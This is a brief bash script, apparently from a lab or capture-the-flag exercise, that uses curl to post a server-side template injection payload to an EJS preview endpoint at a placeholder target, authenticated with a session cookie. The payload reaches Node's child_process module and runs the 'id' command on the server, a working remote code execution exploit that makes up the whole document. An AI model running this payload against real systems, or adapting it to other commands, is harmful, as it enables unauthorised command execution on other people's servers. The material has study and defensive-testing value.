#!/bin/bash
# SSTI via EJS template

curl -s -X POST http://TARGET_IP/staff/preview \
  -H "Cookie: connect.sid=YOUR_COOKIE" \
  --data-urlencode "template=<%= global.process.mainModule.require('child_process').execSync('id').toString() %>"
